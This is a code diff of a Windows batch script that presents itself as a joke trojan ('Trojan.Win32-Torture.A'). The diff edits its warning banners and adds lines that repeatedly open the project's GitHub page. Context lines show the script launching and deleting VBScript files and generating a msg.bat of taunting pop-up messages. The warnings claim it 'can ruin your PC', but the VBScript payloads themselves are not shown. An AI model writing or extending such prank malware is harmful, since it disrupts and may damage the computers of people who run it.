@@ -2,7 +2,7 @@
 TITLE ALERT
 start WD.vbs
 echo: WARNING
-echo: HI! THIS IS A MAWARE.
+echo: HI! THIS IS A (joke) MAWARE.
 echo: IF YOU DONT WANT RUN
 echo: PLEASE CLOSE THIS WINDOW
 echo: OR END THIS TASK W/ TASK MANANGER.
@@ -10,7 +10,7 @@ pause
 cls
 TITLE LAST ALERT
 echo: LAST WARNING
-echo: THIS IS NOT A JOKE,
+echo: THIS IS A JOKE BUT CAN RUIN YOUR PC
 echo: IF YOU WANT YOUR MACHINE INFECTED,
 echo: RUN THIS, I WILL NOT BR BLAMED!
 pause
@@ -25,9 +25,17 @@ start a.vbs
 start a.vbs
 del a.vbs
 start https://github.com/BatatzxX/Trojan.Win32-Torture.A/
+echo the creator
+echo the creator
 start https://github.com/BatatzxX/Trojan.Win32-Torture.A/
+echo the creator
+echo the creator
 start https://github.com/BatatzxX/Trojan.Win32-Torture.A/
+echo the creator
+echo the creator
 start https://github.com/BatatzxX/Trojan.Win32-Torture.A/
+echo the creator
+echo the creator
 echo msg * HAHAHAHAAHAH >>msg.bat
 echo msg * still you using this computer? >>msg.bat
 echo msg * is this a MEMZ reference?!?! >>msg.bat
